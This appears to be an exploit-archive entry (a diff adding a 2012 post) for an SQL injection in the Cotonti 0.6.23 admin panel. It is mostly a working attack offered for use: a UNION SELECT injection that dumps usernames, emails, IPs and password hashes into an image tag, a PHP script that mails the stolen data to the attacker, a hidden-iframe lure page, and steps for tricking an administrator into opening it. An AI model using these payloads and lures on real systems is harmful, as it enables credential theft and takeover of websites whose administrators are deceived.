@@ -1,0 +1,181 @@
+id: 18778
+date: 06/22/2012
+title: Cotonti 0.6.23 SQL Injection Vulnerability
+author: AkaStep
+cves: 
+
+==================================================================
+Vulnerable Software: cotonti-0.6.23
+Official Site: http://www.cotonti.com/
+Tested version: http://cotonti.googlecode.com/files/cotonti-0.6.23.7z
+==================================================================
+About Software:
+
+Cotonti is a powerful open-source web development framework and content manager with
+a focus on security, speed and flexibility.
+==================================================================
+Tested on:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.25
+*/
+
+==================================================================
+Vuln Desc:
+cotonti-0.6.23 is vulnerable to Remote SQL injection vuln.
+==================================================================
+
+Yet I discovered this vuln in seditio 170 version.
+But now i noticed same vuln also affects cotonti-0.6.23 and some previous versions.
+
+Remember folks: SQL Injection in administration panel it doesn't means we can't exploit.It isn't Panacea anymore.
+
+
+Below is fully functional and mixed exploits collection to exploit this vuln and steal admin credentials.
+BTW,depends on your fantasy this vuln also can be used to create in eg: XSS =Steal ANTICSRF tokens=Phish,
+completely dump sed_users table (simple loop and where user_id=INCREMENTED_ID) will do all this things for you.
+Anyways... I'll show  to you how to steal (username,IP,email address,password) from database and silently mail out all this stuff.
+
+Here we go:
+==================================================================
+
+Generating Payload:
+
+Payload 1:
+#We need to create "link" to our snifer#
+mysql> select hex('<img src="http://192.168.0.15/learn/traffic.php?getpwned=') \g
++--------------------------------------------------------------------------------------------------------------------+
+| hex('<img src="http://192.168.0.15/learn/traffic.php?getpwned=')                                                   |
++--------------------------------------------------------------------------------------------------------------------+
+| 3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261666669632E7068703F67657470776E65643D |
++--------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+
+Payload 2:
+#Here we'll close <img tag#
+mysql> select hex('" heigth=0 width=0 />') \g
++--------------------------------------------+
+| hex('" heigth=0 width=0 />')               |
++--------------------------------------------+
+| 22206865696774683D302077696474683D30202F3E |
++--------------------------------------------+
+1 row in set (0.00 sec)
+==================================================================
+
+==================================================================
+Snifer:
+
+//traffic.php
+
+================BEGIN traffic.php===============
+<?php
+error_reporting(0);
+if (isset($_GET['getpwned']))
+{
+$nastycookies=htmlentities(str_ireplace('\'','',$_GET['getpwned']));//some bugfixes xD//
+$sendto='YOUR_EMAIL@GOES_HERE';//your mail address.//
+@mail($sendto,'Your nAsty cookies',PHP_EOL .$nastycookies);//sending mail to you//
+}
+?>
+
+================EOF traffic.php=================
+
+
+
+And now...
+We'll attach the following SQL Injection exploit to our malicious page(to PAGE1.HTML)
+Exploit:
+============== SQL INJECTION EXPLOIT====================
+http://target_site.tld/admin.php?m=hits&f=year&v=1' union select 1,concat(0x3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261666669632E7068703F67657470776E65643D,user_name,0x7c,user_lastip,0x7c,user_email,0x7c,user_password,0x22206865696774683D302077696474683D30202F3E) from sed_users where user_id=1-- AND 1='1
+
+============== EOF SQL INJECTION EXPLOIT================
+
+
+======================================================
+
+
+Creating malicious page which will do all this things for us:
+
+================= PAGE1.HTML====================
+
+<!DOCTYPE HTML>
+<html>
+<head>
+<title></title>
+
+<style type="text/css">
+body
+{
+background-color:white;
+color:red;
+}
+img
+{
+position:absolute;
+top:20px;
+}
+
+iframe
+{
+position:absolute;
+background-color:black;
+color:black;
+visibility:hidden;
+}
+</style>
+</head>
+<body>
+
+<h1>Congrats! You have been PwNeD ;)</h1>
+
+
+<iframe src="http://target_site.tld/admin.php?m=hits&f=year&v=1' union select 1,concat(0x3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261666669632E7068703F67657470776E65643D,user_name,0x7c,user_lastip,0x7c,user_email,0x7c,user_password,0x22206865696774683D302077696474683D30202F3E) from sed_users where user_id=1-- AND 1='1" />
+
+
+</body>
+</html>
+================ EOF PAGE1.HTML==================
+
+################################################################
+Steps to exploiting:
+1) Register on target site.
+2) Send url (to your page1.html)(aka malicious page) to admin throught private message.(Theris a lot ways)
+3) When admin will follow your malicious link to page1.html he/she will be PwnEd ASAP.And you will receive stealed 
+staff (username,IP,email address,password) via mail.
+Something like this: http://s019.radikal.ru/i624/1206/50/e2969a4611c3.png
+################################################################
+
+Thats All.
+
+See you all soon;)
+
+
++++++++++My Special thanks to:+++++++++++++++++++++
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+1337day.com
+secunia.com
+securityhome.eu
+exploitsdownload.com
+to all AA Team + to all Azerbaijan Black HatZ + 
+           *Especially to my bro CAMOUFL4G3.*
+++++++++++++++++++++++++++++++++++++++++++++++++
+
+Respect && Thank you.
+
+/AkaStep ^_^
+
+
+
+#  0day.today [2023-03-26]  #
